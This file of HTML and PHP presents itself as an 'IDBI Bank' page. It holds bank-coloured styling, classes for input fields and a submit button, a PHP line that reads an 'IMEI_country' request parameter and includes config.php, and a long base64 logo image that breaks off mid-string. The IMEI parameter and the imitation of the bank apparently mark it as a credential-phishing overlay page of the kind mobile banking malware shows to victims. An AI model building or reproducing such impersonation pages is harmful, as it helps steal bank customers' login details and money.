<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>IDBI Bank</title>
    <style>
        *, html {
            font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
        }

        html,body,div {
            margin:0;
            padding:0;
            border:0;
            font-size:100%;
            vertical-align:baseline;
            background:transparent

        }

        body {
            background-color: #FFFFFF;
        }

        img {
            max-width: 100%;
        }

        .content {
            width: 100%;
            display: block;
            background: #00836C;
            text-align: center;
        }

        .field-block {
            padding-left: 5%;
            float: left;
            width: 90%;
            font-weight: bold;
            color: #FFFFFF;
            text-align: left;
            font-size: 12px;
        }

        input, select, textarea, th, td {
            display: block;
            padding: 4px;
            margin: 0 auto;
            width: 90%;
        }

        .submit-button {
            border-radius: 3px;
            border: 0 none;
            cursor: pointer;
            display: inline-block;
            margin: 0 15px 10px 0;
            color: #FFF;
            font-weight: bold;
            padding: 3px 8px;
            text-decoration: none;
            background: #f3b82e;
            filter: none !important;
            width: 170px;
            height: 40px;
        }

        .fielderror {
            border: 1px solid #f00;
        }
    </style>
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>

<div class="content" id="content_div">

    <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAgAAZABkAAD/7AARRHVja3kAAQAEAAAARgAA/+EDLWh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8APD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMwNjcgNzkuMTU3NzQ3LCAyMDE1LzAzLzMwLTIzOjQwOjQyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkEwNzI5RTIxRDdBQjExRTU4RjgwRERBMUMyMTNGMjI4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkEwNzI5RTIyRDdBQjExRTU4RjgwRERBMUMyMTNGMjI4Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QTA3MjlFMUZEN0FCMTFFNThGODBEREExQzIxM0YyMjgiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QTA3MjlFMjBEN0FCMTFFNThGODBEREExQzIxM0YyMjgiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7/7gAOQWRvYmUAZMAAAAAB/9sAhAAEAwMDAwMEAwMEBgQDBAYHBQQEBQcIBgYH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